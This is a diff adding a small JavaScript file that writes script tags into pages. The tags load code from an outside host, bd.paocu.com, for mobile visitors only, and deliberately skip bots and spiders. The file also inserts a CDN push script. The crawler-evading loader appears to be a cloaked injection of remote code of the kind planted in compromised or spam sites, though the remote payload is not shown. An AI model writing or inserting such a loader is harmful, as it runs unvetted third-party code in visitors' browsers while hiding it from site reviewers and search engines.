@@ -1,0 +1,7 @@
+var doc=document,ua=navigator.userAgent.toLowerCase(),bot=/bot|spider/.test(ua),mobile=/android|phone|mobi|ipad|ipod|blackberry|symbian|midp/.test(ua),js=function(e){doc.write('<script src="'+e+'"><\/script>')},echo=function(e){doc.write(e)};
+function aa(){mobile&&!bot&&(echo("<style>.article-content{margin-left:-15px;}</style>"),js("//bd.paocu.com/source/k/resource/felb/e-nl/production/g.js"))}
+//function bb(){mobile&&!bot&&js("//bd.paocu.com/production/idc/source/j-ze/static/z/mf.js")}
+function bb(){mobile&&!bot&&echo('<div style="margin-left:-15px;"><script src="//bd.paocu.com/source/k/resource/felb/e-nl/production/g.js"></script></div>')}
+function cc(){mobile&&!bot&&echo('<div style="margin-left: -15px;"><script src="//bd.paocu.com/production/cxw/openjs/dt-y/gug.js"></script></div>')}
+function dd(){mobile&&!bot&&echo('<div style="margin-left: -15px;"><script src="//bd.paocu.com/production/cxw/openjs/dt-y/gug.js"></script></div>')}
+(function(){var el=document.createElement("script");el.src="https://sf1-scmcdn-tos.pstatp.com/goofy/ttzz/push.js?41e19385e480fb7c03d1819ff1d2358f533f9b554381f0f0057cb8bb9cbe6ddf170782289fc0b48cb6a47a33ab8b3d6b99d82128f55a273007ae79783a1ae357";el.id="ttzz";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(el,s)})(window)
